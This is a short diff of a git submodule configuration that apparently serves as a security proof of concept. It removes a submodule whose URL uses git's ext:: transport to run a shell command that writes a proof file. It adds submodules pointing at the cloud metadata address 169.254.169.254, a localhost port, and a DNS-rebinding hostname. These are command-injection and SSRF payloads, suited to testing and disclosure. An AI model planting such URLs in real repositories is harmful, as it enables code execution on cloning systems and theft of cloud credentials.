@@ -1,3 +1,9 @@
-[submodule "exploit"]
-    path = exploit
-    url = ext::sh -c echo%20COMMAND_EXECUTED_VIA_EXT_TRANSPORT > /tmp/ext_rce_proof.txt%20%23
+[submodule "internal-test"]
+    path = internal-test
+    url = http://169.254.169.254/latest/meta-data/
+[submodule "localhost-test"]
+    path = localhost-test
+    url = http://127.0.0.1:3000/
+[submodule "dns-rebind"]
+    path = dns-rebind
+    url = http://169.254.169.254.nip.io/
